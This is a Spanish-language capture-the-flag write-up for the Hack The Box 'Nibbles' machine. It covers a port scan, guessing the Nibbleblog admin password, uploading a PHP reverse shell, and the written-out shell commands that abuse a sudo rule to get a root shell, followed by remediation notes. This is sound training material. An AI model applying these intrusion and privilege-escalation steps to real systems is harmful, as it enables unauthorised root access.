# Nibbles ![Avatar](https://www.hackthebox.eu/storage/avatars/344a8f99e8f7dddfed764f791e2731df_thumb.png)

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

## Enum
### HTTP
En la pagina alojada en la ip encontramos el siguiente comentario en el source
```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
#### Nibbleblog
Encontramos dos vulnerabilidades para este sistema de blog:
```
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                           | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                            | php/remote/38489.rb
----------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Enumeremos subdirectorios y archivos .php a ver si encontramos la version
```
/README (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/feed.php (Status: 200)
/index.php (Status: 200)
/install.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/sitemap.php (Status: 200)
/themes (Status: 301)
/update.php (Status: 200)
```
Viendo el README vemos claramente que la version es la 4.0.3
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```
El unico exploit que tenemos para esa version requiere de autenticación previa, probando combos de creds mas probables encontramos que admin:nibbles funciona

Una vez logeados seguimos los pasos de esta mini guia
```
https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/
```
Y en el ultimo punto subimos la reverse shell de pentestmonkey configurada con nuestra IP y puerto donde pongamos el listener 

## Privesc 
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Bien parece que el script no existe, creemoslo pues
```
nibbler@Nibbles:/home/nibbler$ mkdir personal
nibbler@Nibbles:/home/nibbler$ cd personal
nibbler@Nibbles:/home/nibbler/personal$ mkdir stuff
nibbler@Nibbles:/home/nibbler/personal$ cd stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '#!/bin/bash' > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash' >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff#
```

# Analísís de la intrusión
### Bad password policie
Las credenciales del administrador son facilmente guesseables, gracias a ello accedimos al servicio web
### CVE-2018-16604
Existe una vulnerabilidad en este servicio que nos permite subir y ejecutar código php en el servidor
### Unsecure script privileged execution
Tenemos permisos para ejecutar un script bash como super usuario, el problema esta en que este script no esta en la carpeta, y resulta que somos dueños de los directorios existentes de esta ruta, lo que nos permite crear el resto de la ruta y el propio script, llevandonos a la cima de privilegios del sistema

# Solución
### CVE-2018-16604 
Este CVE no tiene un parche liberado por el fabricante de modo que si queremos arreglar este vector de entrada nos va a tocar ponernos manos a la obra si queremos arreglarlo no nos queda otra que actualizar a la 4.0.5
